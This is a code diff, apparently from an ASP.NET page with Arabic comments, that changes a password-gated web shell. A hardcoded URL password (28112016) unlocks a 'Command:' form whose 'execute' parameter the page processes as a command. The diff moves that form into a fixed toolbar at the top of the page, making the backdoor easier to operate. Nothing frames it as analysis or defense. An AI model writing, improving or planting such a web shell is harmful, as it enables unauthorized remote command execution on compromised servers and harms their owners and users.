@@ -7,6 +7,18 @@
         // تحقق إذا تم تمرير المتغير password في URL
         if (Request["password"] != null && Request["password"] == "28112016")
         {
+            // عرض النموذج لإدخال أوامر إضافية في الأعلى
+            Response.Write(@"
+                <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #f0f0f0; padding: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2);'>
+                    <form method='get'>
+                        Command: <input type='text' name='execute' />
+                        <input type='hidden' name='password' value='28112016' />
+                        <input type='submit' value='Execute' />
+                    </form>
+                </div>
+                <div style='margin-top: 80px;'>
+            ");
+
             // تحقق إذا تم تمرير المتغير execute في URL
             if (Request["execute"] != null)
             {
@@ -46,14 +58,7 @@
                 }
             }
 
-            // عرض النموذج لإدخال أوامر إضافية
-            Response.Write(@"
-                <form method='get'>
-                    Command: <input type='text' name='execute' />
-                    <input type='hidden' name='password' value='28112016' />
-                    <input type='submit' value='Execute' />
-                </form>
-            ");
+            Response.Write("</div>");
         }
         else
         {
